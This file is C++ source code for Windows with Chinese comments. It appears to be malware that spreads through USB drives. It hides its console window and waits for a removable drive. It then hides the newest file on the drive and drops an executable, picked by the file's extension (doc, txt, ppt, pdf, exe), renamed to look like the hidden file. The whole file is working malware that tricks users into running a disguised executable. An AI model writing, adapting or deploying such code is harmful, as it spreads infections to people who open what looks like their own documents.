
#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <stdlib.h>
#include <shellapi.h>
#include <shlobj.h> //vc文件目录下主要是api函数调用
#include <string>
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" ) //隐藏控制台窗口
#pragma comment(lib, "shell32.lib") //什么库
using namespace std;


typedef void *HMEMORYMODULE;
//设计中只用到了dwStartSectors（启动程序植入扇区位置）、dwFileSizeLocation(植入程序大小扇区位置)、ldata(配置信息位置)




TCHAR     szName[MAX_PATH];
TCHAR     szNewPath[MAX_PATH];
TCHAR     Path[MAX_PATH];
LARGE_INTEGER locate;
long HighPart = 1;

const DWORD DefaultKeySeed = 0x20101019;//密钥  设备驱动程序和服务的许多参数都是此类型，以二进制、十六进制或十进制格式显示在注册表编辑器中



//辅助调试函数，可以像printf一样使用，一次输出多个调试参数
//void OutputDebugPrintf(const char * strOutputString, ...)
//{
//	char strBuffer[4096] = { 0 };
//	va_list vlArgs;
//	va_start(vlArgs, strOutputString);
//	_vsnprintf(strBuffer, sizeof(strBuffer)-1, strOutputString, vlArgs);
//	va_end(vlArgs);
//	OutputDebugString(strBuffer);
//}
//


















char * FindUpanPath(char* UpanPath)
{
	DWORD allDisk = GetLogicalDrives();
	WIN32_FIND_DATA FileData;
	HANDLE          hSearch;
	TCHAR           NewPath[MAX_PATH];
	BOOL            fFinished = FALSE;
	FILETIME early;
	int find = 0;

	//OutputDebugPrintf("错误号：%d\n", GetLastError());

	while (1)
	{
		if (allDisk != 0)
		{
			for (int v = 0; v < 20; v++)     //假定最多有10个磁盘		
			{

				if ((allDisk & 1) == 1)
				{
					sprintf(UpanPath, "%c", 'C' + v - 2);	//alldisk是long型第一位表示A盘一次下去如1101表示ABD盘存在C盘不存在，系统从C盘开始存在 故此时v为2 so...... 这个很重要 不然U盘检测就从E盘 而不是C盘开始了
					strcat(UpanPath, ":");
					if (GetDriveType(UpanPath) == DRIVE_REMOVABLE)
					{

						if (GetVolumeInformation(UpanPath, 0, 0, 0, 0, 0, 0, 0)) //判断驱动是否准备就绪	
						{
							//printf("U pan is ready!\n");
							OutputDebugStringA("U盘准备就绪");
							find = 1;
							break;
							//return UpanPath;
						}
						else
						{
							OutputDebugStringA("U盘驱动没准备好");
							
						}
					}
				}
				allDisk = allDisk >> 1;
			}			
		}

		if (find != 1)
		{
			allDisk = GetLogicalDrives();
			continue;
		}
		else
		{
			break;
		}



		//if ((allDisk & 1) != 1) //未检测到U盘		
		//{
		//	OutputDebugStringA("no u pan\n");
		//	//continue;
		//}
		//else
		//{
			//break;
		//}
	}
	
	memset(szNewPath, 0, MAX_PATH);
	lstrcat(szNewPath, UpanPath);
	lstrcat(UpanPath, "\\*.*");

	
	hSearch = FindFirstFile(UpanPath, &FileData);
	if (hSearch == INVALID_HANDLE_VALUE)
	{
		//printf("No text files found.\n");
		return NULL;
	}
	early = FileData.ftLastWriteTime;

	
	while (!fFinished)
	{
	
		if (!FindNextFile(hSearch, &FileData))
		{
			if (GetLastError() == ERROR_NO_MORE_FILES)
			{
				fFinished = TRUE;
			}
			else
			{
				//printf("Could not find next file.\n");
				
			}
		}
		int tt = strlen(FileData.cFileName);
		if (tt >40)
		{
			memset(szName, 0, MAX_PATH);
			lstrcat(szName, FileData.cFileName);
			break;
		}
		if ((FileData.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY))
		{
			
			continue;
		}
		
		if (CompareFileTime(&early, &FileData.ftLastWriteTime) == -1)
		{
			memset(szName, 0, MAX_PATH);
			early = FileData.ftLastWriteTime;
			lstrcat(szName, FileData.cFileName);
		}
		
	}

	memset(NewPath, 0, MAX_PATH);
	lstrcat(NewPath, szNewPath);
	lstrcat(NewPath, "\\");
	lstrcat(NewPath, szName);
	SetFileAttributes(NewPath,FILE_ATTRIBUTE_HIDDEN);


	FindClose(hSearch);
	return UpanPath; 

	/*memset(Path, 0, MAX_PATH);
	lstrcat(Path, szNewPath);
	lstrcat(Path, "\\kidding.exe");
	CopyFile("C:\\Users\\FDD\\Documents\\Visual Studio 2013\\Projects\\test\\Debug\\kidding.exe", Path,FALSE);
	FindClose(hSearch);
	return UpanPath;*/
}






//test.exe就是植入的启动程序run32.exe
void main()
{
	char *UpanPath = new char[5];
	
	TCHAR     Name[MAX_PATH];
	char dllpath[MAX_PATH] = { 0 };
	char currentpath[MAX_PATH] = { 0 };


	char work_path[_MAX_PATH] = { 0 };
	GetModuleFileName(NULL, work_path, _MAX_PATH);
	*(strrchr(work_path, '\\')+1) = 0;


	FindUpanPath(UpanPath);
	if (UpanPath == NULL)
	{
		OutputDebugStringA("FindUpanpath error\n");
		//printf("FindUpanpath error %d\n", GetLastError());
		exit(1);
	}

	


	lstrcat(currentpath, szNewPath);
	lstrcat(currentpath, "\\msvcp120d.dll");
	memset(dllpath, 0, _MAX_PATH);
	lstrcat(dllpath, work_path);
	lstrcat(dllpath, "msvcp120d.dll");
	CopyFile(dllpath, currentpath, FALSE);

	memset(currentpath, 0, MAX_PATH);
	lstrcat(currentpath, szNewPath);
	lstrcat(currentpath, "\\msvcr120d.dll");
	memset(dllpath, 0, _MAX_PATH);
	lstrcat(dllpath, "msvcr120d.dll");
	CopyFile(dllpath, currentpath, FALSE);



	string a = szName;
	char hh[100] = { 0 };
	string aa;
	aa = a.substr(a.find("."));
	
	

	if (a.find(".") == -1)
	{
	

		memset(Path, 0, MAX_PATH);
		lstrcat(Path, szNewPath);
		lstrcat(Path, "\\kidding4.exe");
		lstrcat(work_path, "kidding4.exe");		
		CopyFile(work_path, Path, FALSE);
		
		memset(Name, 0, MAX_PATH);
		lstrcat(Name, szNewPath);
		lstrcat(Name, "\\");
		lstrcat(Name, szName);
		lstrcat(Name, ".exe");

		lstrcat(szNewPath, "\\");
		lstrcat(szNewPath, "kidding4.exe");

		rename(szNewPath, Name);
	}
	else if (aa == ".docx"||aa==".doc")
	{
		memset(Path, 0, MAX_PATH);
		lstrcat(Path, szNewPath);
		lstrcat(Path, "\\kidding.exe");
		lstrcat(work_path, "kidding.exe");
		CopyFile(work_path, Path, FALSE);
		memset(Name, 0, MAX_PATH);
		lstrcat(Name, szNewPath);
		lstrcat(Name, "\\");
		lstrcat(Name, szName);
		lstrcat(Name, ".exe");

		lstrcat(szNewPath, "\\");
		lstrcat(szNewPath, "kidding.exe");
		int kk;
		kk=rename(szNewPath, Name);
		kk = GetLastError();
		
	}
    else if (aa == ".exe")
	{
		memset(Path, 0, MAX_PATH);
		lstrcat(Path, szNewPath);
		lstrcat(Path, "\\kidding2.exe");
		lstrcat(work_path, "kidding2.exe");
		CopyFile(work_path, Path, FALSE);
		memset(Name, 0, MAX_PATH);
		lstrcat(Name, szNewPath);
		lstrcat(Name, "\\");
		lstrcat(Name, szName);
		lstrcat(Name, ".exe");
		lstrcat(szNewPath, "\\");
		lstrcat(szNewPath, "kidding2.exe");

		rename(szNewPath, Name);
	}
	else if (aa == ".txt")
	{
		memset(Path, 0, MAX_PATH);
		lstrcat(Path, szNewPath);
		lstrcat(Path, "\\kidding3.exe");
		lstrcat(work_path, "kidding3.exe");
		CopyFile(work_path, Path, FALSE);
		memset(Name, 0, MAX_PATH);
		lstrcat(Name, szNewPath);
		lstrcat(Name, "\\");
		lstrcat(Name, szName);
		lstrcat(Name, ".exe");

		lstrcat(szNewPath, "\\");
		lstrcat(szNewPath, "kidding3.exe");

		rename(szNewPath, Name);
	}
	else if (aa == ".ppt")
	{
		memset(Path, 0, MAX_PATH);
		lstrcat(Path, szNewPath);
		lstrcat(Path, "\\kidding1.exe");
		lstrcat(work_path, "kidding1.exe");
		CopyFile(work_path, Path, FALSE);
		memset(Name, 0, MAX_PATH);
		lstrcat(Name, szNewPath);
		lstrcat(Name, "\\");
		lstrcat(Name, szName);
		lstrcat(Name, ".exe");

		lstrcat(szNewPath, "\\");
		lstrcat(szNewPath, "kidding1.exe");

		rename(szNewPath, Name);
	}
	else if (aa == ".pdf")
	{
		memset(Path, 0, MAX_PATH);
		lstrcat(Path, szNewPath);
		lstrcat(Path, "\\kidding1.exe");
		lstrcat(work_path, "kidding1.exe");
		CopyFile(work_path, Path, FALSE);
		memset(Name, 0, MAX_PATH);
		lstrcat(Name, szNewPath);
		lstrcat(Name, "\\");
		lstrcat(Name, szName);
		lstrcat(Name, ".exe");

		lstrcat(szNewPath, "\\");
		lstrcat(szNewPath, "kidding1.exe");

		rename(szNewPath, Name);
	}
	else
	{
		memset(Path, 0, MAX_PATH);
		lstrcat(Path, szNewPath);
		lstrcat(Path, "\\kidding2.exe");
		lstrcat(work_path, "kidding2.exe");
		CopyFile(work_path, Path, FALSE);
		memset(Name, 0, MAX_PATH);
		lstrcat(Name, szNewPath);
		lstrcat(Name, "\\");
		lstrcat(Name, szName);
		lstrcat(Name, ".exe");
		lstrcat(szNewPath, "\\");
		lstrcat(szNewPath, "kidding2.exe");

		rename(szNewPath, Name);
	}

	
	





}